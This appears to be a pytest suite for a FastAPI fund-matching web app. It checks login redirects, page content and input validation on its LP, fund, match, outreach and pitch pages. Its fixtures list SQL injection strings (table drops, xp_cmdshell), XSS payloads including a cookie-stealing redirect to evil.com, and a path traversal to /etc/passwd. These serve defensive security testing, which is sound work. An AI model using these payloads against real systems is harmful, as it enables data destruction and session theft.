"""Comprehensive tests for new pages: LP Detail, Fund Detail, Match Detail, Outreach, Pitch.

IMPORTANT: Tests are the source of truth. Do NOT modify tests to make them pass.
If a test fails, fix the APPLICATION, not the test.

Test Categories:
- Unit tests: FastAPI TestClient (fast, no browser)
- Authentication tests: Verify protected routes
- Edge cases: Invalid UUIDs, missing params, special characters
- Security tests: XSS, SQL injection prevention

BDD Reference: docs/prd/tests/test-specifications.md
"""

import uuid
from typing import Any
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from src.main import app


# =============================================================================
# TEST FIXTURES
# =============================================================================


@pytest.fixture
def client() -> TestClient:
    """Create a test client without authentication."""
    with patch("src.main.get_db", return_value=None):
        yield TestClient(app)


@pytest.fixture
def authenticated_client() -> TestClient:
    """Create a test client with mocked GP user authentication."""
    mock_user = {
        "id": "test-user-id",
        "email": "test@example.com",
        "role": "gp_user",
        "org_id": "c0000001-0000-0000-0000-000000000001",
    }
    with patch("src.main.get_db", return_value=None):
        with patch("src.auth.get_current_user", return_value=mock_user):
            yield TestClient(app)


@pytest.fixture
def admin_client() -> TestClient:
    """Create a test client with mocked admin authentication."""
    mock_user = {
        "id": "admin-user-id",
        "email": "admin@example.com",
        "role": "admin",
        "org_id": "c0000001-0000-0000-0000-000000000001",
    }
    with patch("src.main.get_db", return_value=None):
        with patch("src.auth.get_current_user", return_value=mock_user):
            yield TestClient(app)


@pytest.fixture
def valid_uuid() -> str:
    """Generate a valid UUID for testing."""
    return str(uuid.uuid4())


@pytest.fixture
def sample_lp_id() -> str:
    """Sample LP ID matching mock data pattern."""
    return "a1000001-0000-0000-0000-000000000001"


@pytest.fixture
def sample_fund_id() -> str:
    """Sample Fund ID matching mock data pattern."""
    return "0f000001-0000-0000-0000-000000000001"


@pytest.fixture
def sql_injection_payloads() -> list[str]:
    """Common SQL injection attack vectors."""
    return [
        "'; DROP TABLE organizations; --",
        "' OR '1'='1",
        "'; DELETE FROM funds; --",
        "1; UPDATE users SET role='admin' WHERE '1'='1",
        "' UNION SELECT * FROM users; --",
        "1' AND '1'='1",
        "admin'--",
        "' OR 1=1--",
        "'; WAITFOR DELAY '0:0:10'--",
        "1; EXEC xp_cmdshell('dir')--",
    ]


@pytest.fixture
def xss_payloads() -> list[str]:
    """Common XSS attack vectors."""
    return [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "'\"><script>alert('xss')</script>",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "<div style='background:url(javascript:alert(1))'>",
        "'-alert(1)-'",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
    ]


@pytest.fixture
def invalid_uuids() -> list[str]:
    """Invalid UUID formats for edge case testing."""
    return [
        "not-a-uuid",
        "12345",
        "",
        "null",
        "undefined",
        "123e4567-e89b-12d3-a456",  # Truncated
        "123e4567-e89b-12d3-a456-426614174000-extra",  # Too long
        "123e4567e89b12d3a456426614174000",  # No hyphens
        "../../../etc/passwd",  # Path traversal
        "00000000-0000-0000-0000-000000000000",  # Nil UUID (may be valid but unusual)
    ]


# =============================================================================
# LP DETAIL PAGE TESTS - /lps/{lp_id}
# =============================================================================


class TestLPDetailPageAuthentication:
    """Test LP detail page authentication requirements.

    BDD: Feature: LP Detail - Access Control
    """

    def test_unauthenticated_user_redirects_to_login(self, client):
        """
        BDD: Scenario: Unauthenticated access to LP detail
        Given I am not logged in
        When I navigate to /lps/{lp_id}
        Then I am redirected to login page
        """
        response = client.get("/lps/a1000001-0000-0000-0000-000000000001", follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"

    def test_authenticated_user_can_access_lp_detail(self, authenticated_client, sample_lp_id):
        """
        BDD: Scenario: Authenticated access to LP detail
        Given I am logged in as GP user
        When I navigate to /lps/{lp_id}
        Then I see the LP detail page
        """
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]


class TestLPDetailPageContent:
    """Test LP detail page content and structure.

    BDD: Feature: LP Detail - Content Display
    """

    def test_lp_detail_contains_breadcrumb(self, authenticated_client, sample_lp_id):
        """LP detail page should have navigation breadcrumb."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert "Search" in response.text or "LPs" in response.text

    def test_lp_detail_contains_lp_name(self, authenticated_client, sample_lp_id):
        """LP detail page should display LP name."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        # Mock data has California Public Pension
        assert "California" in response.text or "LP" in response.text

    def test_lp_detail_contains_overview_section(self, authenticated_client, sample_lp_id):
        """LP detail page should have overview section with AUM."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert "Overview" in response.text or "AUM" in response.text

    def test_lp_detail_contains_match_score_section(self, authenticated_client, sample_lp_id):
        """LP detail page should have match score section."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert "Match" in response.text or "Score" in response.text

    def test_lp_detail_contains_shortlist_button(self, authenticated_client, sample_lp_id):
        """LP detail page should have shortlist action button."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert "Shortlist" in response.text or "shortlist" in response.text

    def test_lp_detail_contains_generate_pitch_link(self, authenticated_client, sample_lp_id):
        """LP detail page should have link to generate pitch."""
        response = authenticated_client.get(f"/lps/{sample_lp_id}")
        assert "Pitch" in response.text or "/pitch" in response.text


class TestLPDetailPageEdgeCases:
    """Test LP detail page edge cases and error handling.

    BDD: Feature: LP Detail - Input Validation
    """

    def test_invalid_uuid_returns_400(self, authenticated_client):
        """
        BDD: Scenario: Invalid UUID in LP detail URL
        Given I am logged in
        When I navigate to /lps/invalid-uuid
        Then I receive 400 Bad Request
        """
        response = authenticated_client.get("/lps/not-a-valid-uuid")
        assert response.status_code == 400

    def test_path_traversal_attempt_fails(self, authenticated_client):
        """
        BDD: Scenario: Path traversal attack
        When I try /lps/../../../etc/passwd
        Then the attack is blocked
        """
        response = authenticated_client.get("/lps/../../../etc/passwd")
        assert response.status_code in [400, 404]
        assert "passwd" not in response.text.lower()

    def test_empty_lp_id_returns_lp_search(self, authenticated_client):
        """
        BDD: Scenario: Empty LP ID path
        When I navigate to /lps/
        Then I see the LP search page (not an error)
        Note: /lps/ without ID routes to the LP search page
        """
        response = authenticated_client.get("/lps/")
        # /lps/ is a valid route (LP search page)
        assert response.status_code in [200, 307]

    def test_extremely_long_lp_id_handled(self, authenticated_client):
        """
        BDD: Scenario: Extremely long LP ID
        When I provide LP ID longer than UUID
        Then request is rejected gracefully
        """
        long_id = "a" * 1000
        response = authenticated_client.get(f"/lps/{long_id}")
        assert response.status_code == 400
        assert "traceback" not in response.text.lower()

    def test_unicode_in_lp_id_handled(self, authenticated_client):
        """
        BDD: Scenario: Unicode characters in LP ID
        When I provide LP ID with unicode
        Then request is handled safely
        """
        response = authenticated_client.get("/lps/北京投资基金")
        assert response.status_code == 400


class TestLPDetailPageSecurity:
    """Test LP detail page security.

    BDD: Feature: LP Detail - Security
    """

    def test_sql_injection_in_lp_id_blocked(self, authenticated_client, sql_injection_payloads):
        """
        BDD: Scenario: SQL injection in LP ID
        When I provide SQL injection payload as LP ID
        Then the attack is blocked
        And no database error is exposed
        """
        for payload in sql_injection_payloads:
            response = authenticated_client.get(f"/lps/{payload}")
            assert response.status_code in [400, 404]
            assert "sql" not in response.text.lower()
            assert "syntax error" not in response.text.lower()
            assert "traceback" not in response.text.lower()

    def test_xss_in_lp_id_escaped(self, authenticated_client, xss_payloads):
        """
        BDD: Scenario: XSS in LP ID
        When I provide XSS payload as LP ID
        Then the payload is not executed
        And the content is escaped
        """
        for payload in xss_payloads:
            response = authenticated_client.get(f"/lps/{payload}")
            # Should reject invalid UUID or escape content
            if response.status_code == 200:
                # If somehow 200, content must be escaped
                assert "<script>" not in response.text
                assert "onerror=" not in response.text


# =============================================================================
# FUND DETAIL PAGE TESTS - /funds/{fund_id}
# =============================================================================


class TestFundDetailPageAuthentication:
    """Test fund detail page authentication requirements.

    BDD: Feature: Fund Detail - Access Control
    """

    def test_unauthenticated_user_redirects_to_login(self, client, sample_fund_id):
        """
        BDD: Scenario: Unauthenticated access to fund detail
        Given I am not logged in
        When I navigate to /funds/{fund_id}
        Then I am redirected to login page
        """
        response = client.get(f"/funds/{sample_fund_id}", follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"

    def test_authenticated_user_can_access_fund_detail(self, authenticated_client, sample_fund_id):
        """
        BDD: Scenario: Authenticated access to fund detail
        Given I am logged in as GP user
        When I navigate to /funds/{fund_id}
        Then I see the fund detail page
        """
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]


class TestFundDetailPageContent:
    """Test fund detail page content and structure.

    BDD: Feature: Fund Detail - Content Display
    """

    def test_fund_detail_contains_breadcrumb(self, authenticated_client, sample_fund_id):
        """Fund detail page should have navigation breadcrumb."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Funds" in response.text

    def test_fund_detail_contains_fund_name(self, authenticated_client, sample_fund_id):
        """Fund detail page should display fund name."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Fund" in response.text

    def test_fund_detail_contains_overview_section(self, authenticated_client, sample_fund_id):
        """Fund detail page should have fund overview."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Overview" in response.text or "Target" in response.text

    def test_fund_detail_contains_track_record(self, authenticated_client, sample_fund_id):
        """Fund detail page should show track record."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Track Record" in response.text or "MOIC" in response.text or "IRR" in response.text

    def test_fund_detail_contains_matching_stats(self, authenticated_client, sample_fund_id):
        """Fund detail page should show matching statistics."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Match" in response.text

    def test_fund_detail_contains_view_matches_link(self, authenticated_client, sample_fund_id):
        """Fund detail page should have link to view matches."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "/matches" in response.text or "Matches" in response.text

    def test_fund_detail_contains_edit_link(self, authenticated_client, sample_fund_id):
        """Fund detail page should have edit fund link."""
        response = authenticated_client.get(f"/funds/{sample_fund_id}")
        assert "Edit" in response.text or "/edit" in response.text


class TestFundDetailPageEdgeCases:
    """Test fund detail page edge cases.

    BDD: Feature: Fund Detail - Input Validation
    """

    def test_invalid_uuid_returns_400(self, authenticated_client):
        """Invalid fund UUID should return 400."""
        response = authenticated_client.get("/funds/not-a-valid-uuid")
        assert response.status_code == 400

    def test_sql_injection_blocked(self, authenticated_client, sql_injection_payloads):
        """SQL injection in fund ID should be blocked."""
        for payload in sql_injection_payloads:
            response = authenticated_client.get(f"/funds/{payload}")
            assert response.status_code in [400, 404]
            assert "sql" not in response.text.lower()

    def test_xss_in_fund_id_handled(self, authenticated_client, xss_payloads):
        """XSS in fund ID should be handled safely."""
        for payload in xss_payloads[:3]:  # Test subset for speed
            response = authenticated_client.get(f"/funds/{payload}")
            if response.status_code == 200:
                assert "<script>" not in response.text


# =============================================================================
# MATCH DETAIL PAGE TESTS - /matches/{lp_id}
# =============================================================================


class TestMatchDetailPageAuthentication:
    """Test match detail page authentication requirements.

    BDD: Feature: Match Detail - Access Control
    """

    def test_unauthenticated_user_redirects_to_login(self, client, sample_lp_id):
        """
        BDD: Scenario: Unauthenticated access to match detail
        Given I am not logged in
        When I navigate to /matches/{lp_id}
        Then I am redirected to login page
        """
        response = client.get(f"/matches/{sample_lp_id}", follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"

    def test_authenticated_user_can_access_match_detail(self, authenticated_client, sample_lp_id):
        """
        BDD: Scenario: Authenticated access to match detail
        Given I am logged in as GP user
        When I navigate to /matches/{lp_id}
        Then I see the match detail page
        """
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]


class TestMatchDetailPageContent:
    """Test match detail page content and structure.

    BDD: Feature: Match Detail - Content Display
    """

    def test_match_detail_contains_score_breakdown(self, authenticated_client, sample_lp_id):
        """Match detail page should show score breakdown."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert "Score" in response.text or "score" in response.text

    def test_match_detail_contains_ai_analysis(self, authenticated_client, sample_lp_id):
        """Match detail page should show AI analysis."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert "AI" in response.text or "Analysis" in response.text or "Match" in response.text

    def test_match_detail_contains_talking_points(self, authenticated_client, sample_lp_id):
        """Match detail page should show talking points."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert "Talking" in response.text or "Points" in response.text or "Highlight" in response.text

    def test_match_detail_contains_breadcrumb(self, authenticated_client, sample_lp_id):
        """Match detail page should have breadcrumb navigation."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert "Matches" in response.text or "Funds" in response.text

    def test_match_detail_contains_generate_pitch_link(self, authenticated_client, sample_lp_id):
        """Match detail page should have link to generate pitch."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}")
        assert "Pitch" in response.text or "/pitch" in response.text


class TestMatchDetailPageWithFundId:
    """Test match detail page with optional fund_id parameter.

    BDD: Feature: Match Detail - Fund Context
    """

    def test_match_detail_with_fund_id_parameter(self, authenticated_client, sample_lp_id, sample_fund_id):
        """Match detail with fund_id should show fund-specific match."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}?fund_id={sample_fund_id}")
        assert response.status_code == 200

    def test_match_detail_with_invalid_fund_id(self, authenticated_client, sample_lp_id):
        """Match detail with invalid fund_id should handle gracefully."""
        response = authenticated_client.get(f"/matches/{sample_lp_id}?fund_id=invalid")
        # Should still work, just using default fund
        assert response.status_code in [200, 400]


class TestMatchDetailPageEdgeCases:
    """Test match detail page edge cases.

    BDD: Feature: Match Detail - Input Validation
    """

    def test_invalid_lp_uuid_returns_400(self, authenticated_client):
        """Invalid LP UUID should return 400."""
        response = authenticated_client.get("/matches/not-a-valid-uuid")
        assert response.status_code == 400

    def test_sql_injection_blocked(self, authenticated_client, sql_injection_payloads):
        """SQL injection in LP ID should be blocked."""
        for payload in sql_injection_payloads[:3]:
            response = authenticated_client.get(f"/matches/{payload}")
            assert response.status_code in [400, 404]

    def test_xss_in_query_param_handled(self, authenticated_client, sample_lp_id, xss_payloads):
        """XSS in fund_id query param should be handled.

        Note: The page has legitimate script tags (HTMX, copy function).
        This test verifies XSS payloads are escaped, not injected as HTML.
        """
        for payload in xss_payloads[:2]:
            from urllib.parse import quote
            response = authenticated_client.get(f"/matches/{sample_lp_id}?fund_id={quote(payload)}")
            if response.status_code == 200:
                # XSS payload should NOT appear unescaped in response
                # Jinja2 auto-escapes, so <script>alert should become &lt;script&gt;alert
                assert f">{payload}<" not in response.text  # Payload should not be rendered as HTML
                assert "onerror=alert" not in response.text  # Event handlers should be escaped


# =============================================================================
# OUTREACH HUB PAGE TESTS - /outreach
# =============================================================================


class TestOutreachPageAuthentication:
    """Test outreach hub authentication requirements.

    BDD: Feature: Outreach Hub - Access Control
    """

    def test_unauthenticated_user_redirects_to_login(self, client):
        """
        BDD: Scenario: Unauthenticated access to outreach
        Given I am not logged in
        When I navigate to /outreach
        Then I am redirected to login page
        """
        response = client.get("/outreach", follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"

    def test_authenticated_user_can_access_outreach(self, authenticated_client):
        """
        BDD: Scenario: Authenticated access to outreach
        Given I am logged in as GP user
        When I navigate to /outreach
        Then I see the outreach hub page
        """
        response = authenticated_client.get("/outreach")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]


class TestOutreachPageContent:
    """Test outreach hub content and structure.

    BDD: Feature: Outreach Hub - Content Display
    """

    def test_outreach_contains_header(self, authenticated_client):
        """Outreach hub should have page header."""
        response = authenticated_client.get("/outreach")
        assert "Outreach" in response.text

    def test_outreach_contains_stats(self, authenticated_client):
        """Outreach hub should show statistics."""
        response = authenticated_client.get("/outreach")
        # Should have stats like shortlisted, contacted, meetings
        assert "Shortlisted" in response.text or "Contacted" in response.text or "Meeting" in response.text

    def test_outreach_contains_activity_feed(self, authenticated_client):
        """Outreach hub should have activity feed."""
        response = authenticated_client.get("/outreach")
        assert "Activity" in response.text or "Recent" in response.text

    def test_outreach_contains_quick_actions(self, authenticated_client):
        """Outreach hub should have quick actions."""
        response = authenticated_client.get("/outreach")
        assert "Action" in response.text or "Pitch" in response.text

    def test_outreach_contains_fund_filter(self, authenticated_client):
        """Outreach hub should have fund filter."""
        response = authenticated_client.get("/outreach")
        assert "Fund" in response.text or "select" in response.text.lower()


class TestOutreachPageNoErrors:
    """Test outreach hub error handling.

    BDD: Feature: Outreach Hub - Robustness
    """

    def test_outreach_no_server_errors(self, authenticated_client):
        """Outreach page should not expose server errors."""
        response = authenticated_client.get("/outreach")
        assert "traceback" not in response.text.lower()
        assert "exception" not in response.text.lower() or "error" not in response.text.lower()

    def test_outreach_handles_empty_state(self, authenticated_client):
        """Outreach page should handle empty data gracefully."""
        response = authenticated_client.get("/outreach")
        # Should show empty state or mock data, not error
        assert response.status_code == 200


# =============================================================================
# PITCH GENERATOR PAGE TESTS - /pitch
# =============================================================================


class TestPitchGeneratorAuthentication:
    """Test pitch generator authentication requirements.

    BDD: Feature: Pitch Generator - Access Control
    """

    def test_unauthenticated_user_redirects_to_login(self, client):
        """
        BDD: Scenario: Unauthenticated access to pitch generator
        Given I am not logged in
        When I navigate to /pitch
        Then I am redirected to login page
        """
        response = client.get("/pitch", follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"

    def test_authenticated_user_can_access_pitch_generator(self, authenticated_client):
        """
        BDD: Scenario: Authenticated access to pitch generator
        Given I am logged in as GP user
        When I navigate to /pitch
        Then I see the pitch generator page
        """
        response = authenticated_client.get("/pitch")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]


class TestPitchGeneratorContent:
    """Test pitch generator content and structure.

    BDD: Feature: Pitch Generator - Content Display
    """

    def test_pitch_generator_contains_header(self, authenticated_client):
        """Pitch generator should have page header."""
        response = authenticated_client.get("/pitch")
        assert "Pitch" in response.text or "Generator" in response.text

    def test_pitch_generator_contains_form(self, authenticated_client):
        """Pitch generator should have generation form."""
        response = authenticated_client.get("/pitch")
        assert "form" in response.text.lower() or "Generate" in response.text

    def test_pitch_generator_contains_human_review_warning(self, authenticated_client):
        """Pitch generator should warn about human review requirement."""
        response = authenticated_client.get("/pitch")
        assert "review" in response.text.lower() or "AI" in response.text

    def test_pitch_generator_contains_settings_panel(self, authenticated_client):
        """Pitch generator should have settings/options panel."""
        response = authenticated_client.get("/pitch")
        assert "Settings" in response.text or "Tone" in response.text or "Length" in response.text


class TestPitchGeneratorWithParameters:
    """Test pitch generator with query parameters.

    BDD: Feature: Pitch Generator - Pre-filled Context
    """

    def test_pitch_generator_with_lp_id(self, authenticated_client, sample_lp_id):
        """Pitch generator with LP ID should pre-fill LP context."""
        response = authenticated_client.get(f"/pitch?lp_id={sample_lp_id}")
        assert response.status_code == 200

    def test_pitch_generator_with_fund_id(self, authenticated_client, sample_fund_id):
        """Pitch generator with fund ID should pre-fill fund context."""
        response = authenticated_client.get(f"/pitch?fund_id={sample_fund_id}")
        assert response.status_code == 200

    def test_pitch_generator_with_both_ids(self, authenticated_client, sample_lp_id, sample_fund_id):
        """Pitch generator with both IDs should show match context."""
        response = authenticated_client.get(f"/pitch?lp_id={sample_lp_id}&fund_id={sample_fund_id}")
        assert response.status_code == 200


class TestPitchGeneratorEdgeCases:
    """Test pitch generator edge cases.

    BDD: Feature: Pitch Generator - Input Validation
    """

    def test_invalid_lp_id_handled(self, authenticated_client):
        """Invalid LP ID in query should be handled gracefully."""
        response = authenticated_client.get("/pitch?lp_id=invalid-uuid")
        # Should still load page, just without LP context
        assert response.status_code == 200

    def test_sql_injection_in_query_params_blocked(self, authenticated_client, sql_injection_payloads):
        """SQL injection in query params should be blocked."""
        for payload in sql_injection_payloads[:2]:
            response = authenticated_client.get(f"/pitch?lp_id={payload}")
            assert "sql" not in response.text.lower()
            assert "syntax error" not in response.text.lower()

    def test_xss_in_query_params_escaped(self, authenticated_client, xss_payloads):
        """XSS in query params should be escaped."""
        for payload in xss_payloads[:2]:
            response = authenticated_client.get(f"/pitch?lp_id={payload}")
            if response.status_code == 200:
                assert "<script>alert" not in response.text


# =============================================================================
# CROSS-CUTTING SECURITY TESTS
# =============================================================================


class TestAllNewPagesNoStackTraceExposure:
    """Verify no pages expose stack traces.

    BDD: Feature: Security - Error Handling
    """

    @pytest.mark.parametrize("path", [
        "/lps/invalid",
        "/funds/invalid",
        "/matches/invalid",
        "/outreach",
        "/pitch",
    ])
    def test_no_stack_trace_in_response(self, authenticated_client, path):
        """Pages should never expose Python stack traces."""
        response = authenticated_client.get(path)
        content = response.text.lower()
        assert "traceback (most recent call last)" not in content
        assert 'file "/' not in content
        assert "psycopg" not in content


class TestAllNewPagesContentSecurity:
    """Verify content security across all new pages.

    BDD: Feature: Security - Response Headers
    """

    @pytest.mark.parametrize("path", [
        "/lps/a1000001-0000-0000-0000-000000000001",
        "/funds/0f000001-0000-0000-0000-000000000001",
        "/matches/a1000001-0000-0000-0000-000000000001",
        "/outreach",
        "/pitch",
    ])
    def test_pages_return_html(self, authenticated_client, path):
        """All pages should return HTML content type."""
        response = authenticated_client.get(path)
        assert "text/html" in response.headers["content-type"]

    @pytest.mark.parametrize("path", [
        "/lps/a1000001-0000-0000-0000-000000000001",
        "/funds/0f000001-0000-0000-0000-000000000001",
        "/matches/a1000001-0000-0000-0000-000000000001",
        "/outreach",
        "/pitch",
    ])
    def test_pages_have_doctype(self, authenticated_client, path):
        """All pages should have proper HTML doctype."""
        response = authenticated_client.get(path)
        # Either has doctype or extends a base template that has it
        content = response.text.lower()
        assert "<!doctype html>" in content or "<html" in content


class TestAllNewPagesAuthenticationRequired:
    """Verify all new pages require authentication.

    BDD: Feature: Access Control - Protected Routes
    """

    @pytest.mark.parametrize("path", [
        "/lps/a1000001-0000-0000-0000-000000000001",
        "/funds/0f000001-0000-0000-0000-000000000001",
        "/matches/a1000001-0000-0000-0000-000000000001",
        "/outreach",
        "/pitch",
    ])
    def test_unauthenticated_redirects_to_login(self, client, path):
        """All protected pages should redirect unauthenticated users."""
        response = client.get(path, follow_redirects=False)
        assert response.status_code == 303
        assert response.headers["location"] == "/login"


# =============================================================================
# INPUT VALIDATION COMPREHENSIVE TESTS
# =============================================================================


class TestUUIDValidationAllRoutes:
    """Test UUID validation across all routes with ID parameters.

    BDD: Feature: Input Validation - UUID Format
    """

    @pytest.mark.parametrize("invalid_uuid", [
        "not-a-uuid",
        "12345",
        "",
        "null",
        "undefined",
        "123e4567-e89b-12d3-a456",  # Truncated
        "../../../etc/passwd",  # Path traversal
        "<script>alert(1)</script>",  # XSS
        "'; DROP TABLE users; --",  # SQL injection
    ])
    def test_lp_detail_rejects_invalid_uuid(self, authenticated_client, invalid_uuid):
        """LP detail should reject invalid UUIDs.

        Note: Some path-like values (../) may return 404 due to routing.
        Both 400 and 404 are acceptable rejection codes.
        """
        if invalid_uuid:  # Skip empty string as it changes the route
            response = authenticated_client.get(f"/lps/{invalid_uuid}")
            assert response.status_code in [400, 404], f"Expected 400 or 404 for '{invalid_uuid}'"

    @pytest.mark.parametrize("invalid_uuid", [
        "not-a-uuid",
        "12345",
        "123e4567-e89b-12d3-a456",
    ])
    def test_fund_detail_rejects_invalid_uuid(self, authenticated_client, invalid_uuid):
        """Fund detail should reject invalid UUIDs."""
        response = authenticated_client.get(f"/funds/{invalid_uuid}")
        assert response.status_code == 400

    @pytest.mark.parametrize("invalid_uuid", [
        "not-a-uuid",
        "12345",
        "123e4567-e89b-12d3-a456",
    ])
    def test_match_detail_rejects_invalid_uuid(self, authenticated_client, invalid_uuid):
        """Match detail should reject invalid UUIDs."""
        response = authenticated_client.get(f"/matches/{invalid_uuid}")
        assert response.status_code == 400


class TestSpecialCharacterHandling:
    """Test special character handling across routes.

    BDD: Feature: Input Validation - Special Characters
    """

    @pytest.mark.parametrize("special_input", [
        "O'Brien",  # Apostrophe
        "Test & Co",  # Ampersand
        "Firm < > LLC",  # Angle brackets
        '"Quoted"',  # Quotes
        "100%",  # Percent
        "Firm#1",  # Hash
        "a=b&c=d",  # Query-like
    ])
    def test_pitch_handles_special_chars_in_query(self, authenticated_client, special_input):
        """Pitch generator should handle special characters safely."""
        from urllib.parse import quote
        encoded = quote(special_input)
        response = authenticated_client.get(f"/pitch?notes={encoded}")
        assert response.status_code == 200
        assert "traceback" not in response.text.lower()


# =============================================================================
# PERFORMANCE AND ROBUSTNESS TESTS
# =============================================================================


class TestResponseTimes:
    """Test that pages respond in reasonable time.

    BDD: Feature: Performance - Response Time
    """

    @pytest.mark.parametrize("path", [
        "/lps/a1000001-0000-0000-0000-000000000001",
        "/funds/0f000001-0000-0000-0000-000000000001",
        "/matches/a1000001-0000-0000-0000-000000000001",
        "/outreach",
        "/pitch",
    ])
    def test_page_responds_quickly(self, authenticated_client, path):
        """Pages should respond within reasonable time (no hanging)."""
        import time
        start = time.time()
        response = authenticated_client.get(path)
        elapsed = time.time() - start
        assert response.status_code in [200, 303, 400]
        assert elapsed < 5.0, f"Page {path} took too long: {elapsed}s"


class TestConcurrentRequests:
    """Test handling of concurrent requests.

    BDD: Feature: Robustness - Concurrent Access
    """

    def test_multiple_requests_same_page(self, authenticated_client):
        """Page should handle multiple rapid requests."""
        for _ in range(10):
            response = authenticated_client.get("/outreach")
            assert response.status_code == 200

    def test_multiple_requests_different_pages(self, authenticated_client):
        """Different pages should handle rapid switching."""
        pages = ["/outreach", "/pitch", "/lps/a1000001-0000-0000-0000-000000000001"]
        for _ in range(3):
            for page in pages:
                response = authenticated_client.get(page)
                assert response.status_code in [200, 400]
